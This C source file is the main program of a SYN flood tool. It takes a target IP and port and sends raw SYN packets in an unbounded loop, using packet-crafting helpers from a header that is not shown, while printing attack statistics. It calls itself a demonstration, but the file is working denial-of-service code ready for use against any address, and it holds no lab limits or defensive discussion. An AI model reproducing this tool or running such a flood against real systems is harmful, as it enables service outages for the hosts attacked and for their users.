/**
 * main.c
 *
 * Main implementation file for the SYN flood demonstration tool.
 * Handles command-line arguments, initializes packet structures,
 * and controls the packet transmission flow.
 *
 * @author Mohamed Gebril
 * @date March 2025
 * @license MIT
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <signal.h>
#include <stdint.h>
#include <unistd.h> /* For usleep() */
#include <arpa/inet.h>
#include "headers/network_utils.h"

// Global variables for statistics and control
volatile sig_atomic_t program_running = 1;
uint64_t packets_sent = 0;
time_t start_time;

/**
 * Signal handler for clean termination.
 *
 * Captures SIGINT (Ctrl+C) to allow for graceful shutdown
 * and statistics reporting.
 *
 * @param signum The signal number received
 */
void handle_signal(int signum)
{
    if (signum == SIGINT)
    {
        program_running = 0;
    }
}

/**
 * Displays usage information.
 *
 * Prints the correct command line syntax and exits the program.
 *
 * @param program_name The name of the executable
 */
void display_usage(const char *program_name)
{
    fprintf(stderr, "Usage: %s <destination_ip> <port> [packet_delay_ms]\n", program_name);
    fprintf(stderr, "\n");
    fprintf(stderr, "Arguments:\n");
    fprintf(stderr, "  destination_ip   - Target IP address\n");
    fprintf(stderr, "  port             - Target port number (1-65535)\n");
    fprintf(stderr, "  packet_delay_ms  - Optional delay between packets in ms (default: 0)\n");
    fprintf(stderr, "\n");
    fprintf(stderr, "Example: %s 192.168.1.1 80 5\n", program_name);
    exit(EXIT_FAILURE);
}

/**
 * Validates an IP address string.
 *
 * Ensures the provided string is a valid IPv4 address.
 *
 * @param ip_str The IP address string to validate
 * @return int 1 if valid, 0 if invalid
 */
int validate_ip_address(const char *ip_str)
{
    struct in_addr addr;
    return inet_pton(AF_INET, ip_str, &addr) == 1;
}

/**
 * Displays runtime statistics.
 *
 * Shows information about the ongoing attack including
 * packets sent and duration.
 */
void display_statistics()
{
    time_t current_time = time(NULL);
    double elapsed_seconds = difftime(current_time, start_time);
    double packets_per_second = 0;

    if (elapsed_seconds > 0)
    {
        packets_per_second = packets_sent / elapsed_seconds;
    }

    printf("\r[INFO] Packets sent: %lu | Duration: %.0f seconds | Rate: %.2f pps",
           packets_sent, elapsed_seconds, packets_per_second);
    fflush(stdout);
}

/**
 * Program entry point.
 *
 * Parses command line arguments, sets up packet structures,
 * and controls the SYN packet transmission loop.
 *
 * @param argc Argument count
 * @param argv Argument values
 * @return int Exit code
 */
int main(int argc, char *argv[])
{
    if (argc < 3 || argc > 4)
    {
        display_usage(argv[0]);
    }

    // Parse and validate command line arguments
    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int packet_delay_ms = 0;

    if (argc == 4)
    {
        packet_delay_ms = atoi(argv[3]);
        if (packet_delay_ms < 0)
        {
            fprintf(stderr, "[ERROR] Packet delay must be non-negative\n");
            exit(EXIT_FAILURE);
        }
    }

    // Validate IP address
    if (!validate_ip_address(target_ip))
    {
        fprintf(stderr, "[ERROR] Invalid IP address format: %s\n", target_ip);
        exit(EXIT_FAILURE);
    }

    // Validate port number
    if (target_port <= 0 || target_port > 65535)
    {
        fprintf(stderr, "[ERROR] Port must be between 1 and 65535\n");
        exit(EXIT_FAILURE);
    }

    // Set up signal handling for graceful termination
    signal(SIGINT, handle_signal);

    // Prepare packet buffer
    uint8_t packet_buffer[PACKET_LEN];
    struct ipheader *ip_header = (struct ipheader *)packet_buffer;
    struct tcpheader *tcp_header = (struct tcpheader *)(packet_buffer + sizeof(struct ipheader));

    // Initialize random seed
    srand((unsigned int)time(NULL));

    // Record start time for statistics
    start_time = time(NULL);

    printf("[INFO] Starting SYN flood attack on %s:%d\n", target_ip, target_port);
    printf("[INFO] Press Ctrl+C to stop the attack\n");

    // Main packet transmission loop
    while (program_running)
    {
        // Clear the packet buffer
        memset(packet_buffer, 0, PACKET_LEN);

        // Initialize packet headers
        network_initialize_tcp_header(tcp_header, (uint16_t)target_port);
        network_initialize_ip_header(ip_header, target_ip);

        // Calculate TCP checksum
        tcp_header->tcp_sum = network_calculate_tcp_checksum(ip_header);

        // Send the packet
        network_send_raw_ip_packet(ip_header);

        // Update statistics
        packets_sent++;

        // Display progress every 1000 packets
        if (packets_sent % 1000 == 0)
        {
            display_statistics();
        }

        // Apply delay if specified
        if (packet_delay_ms > 0)
        {
            usleep(packet_delay_ms * 1000);
        }
    }

    // Final statistics display
    printf("\n[INFO] Attack stopped\n");
    display_statistics();
    printf("\n[INFO] Exiting...\n");

    return EXIT_SUCCESS;
}